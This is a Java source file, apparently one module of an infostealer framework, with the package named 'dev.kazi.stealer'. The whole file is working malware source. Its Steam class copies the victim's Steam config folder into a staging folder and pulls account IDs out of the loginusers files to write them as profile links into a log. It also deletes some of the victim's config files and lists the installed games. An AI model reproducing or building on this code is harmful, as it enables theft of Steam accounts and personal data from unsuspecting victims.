package dev.kazi.stealer.node.nodes.impl.app;

import java.util.regex.Matcher;
import java.io.IOException;
import java.nio.file.FileAlreadyExistsException;
import java.util.regex.Pattern;
import dev.kazi.stealer.utils.Util;
import java.util.Objects;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.nio.file.Files;
import java.nio.file.CopyOption;
import java.io.File;
import dev.kazi.stealer.node.Category;
import dev.kazi.stealer.node.Node;

public class Steam extends Node {

    public Steam() {
        super(Category.FILE);
    }
    
    @Override
    public void createNode() {
        final File logged_accs = new File(System.getenv("ProgramFiles(X86)") + "\\Steam\\config\\");
        if (logged_accs.exists()) {
            try {
                Files.copy(logged_accs.toPath(), this.mergePath(new File("C:\\Users\\" + System.getProperty("user.name")), "Steam").toPath(), new CopyOption[0]);
                final FileWriter writer = new FileWriter(this.getFolder() + "\\steam\\Log_Info.txt");
                final BufferedWriter bufferedWriter = new BufferedWriter(writer);
                bufferedWriter.write("Logged accounts:");
                bufferedWriter.newLine();
                for (final File file : Objects.requireNonNull(logged_accs.listFiles())) {
                    if (file.getName().contains("loginusers")) {
                        final String fileContent = Util.toString(file);
                        final String regex = "\\b\\w{17}\\b";
                        final Pattern pattern = Pattern.compile("\\b\\w{17}\\b", 8);
                        final Matcher matcher = pattern.matcher(fileContent);
                        while (matcher.find()) {
                            bufferedWriter.write("http://steamcommunity.com/profiles/" + matcher.group(0) + "\n");
                        }
                    }
                }
                for (final File file2 : Objects.requireNonNull(logged_accs.listFiles())) {
                    if (file2.getName().contains("coplay_")) {
                        file2.delete();
                    }
                    else if (file2.getName().contains("DialogConfigOverlay")) {
                        file2.delete();
                    }
                }
                bufferedWriter.newLine();
                bufferedWriter.write("Installed games:");
                bufferedWriter.newLine();
                final File installed_games = new File(System.getenv("ProgramFiles(X86)") + "\\Steam\\steamapps\\");
                for (final File file3 : Objects.requireNonNull(installed_games.listFiles())) {
                    if (file3.getName().contains("appmanifest_")) {
                        final String fileContent2 = Util.toString(file3);
                        for (final String str : fileContent2.split("\n")) {
                            if (str.contains("\"name\"")) {
                                final String cleaned = str.replace("\"name\"", "").replace("\t", "").replace("\"", "");
                                bufferedWriter.write(cleaned + "\n");
                            }
                        }
                    }
                }
                bufferedWriter.close();
            }
            catch (final FileAlreadyExistsException fileAlreadyExistsException) {
                fileAlreadyExistsException.printStackTrace();
            }
            catch (final IOException e) {
                e.printStackTrace();
            }
        }
    }
}
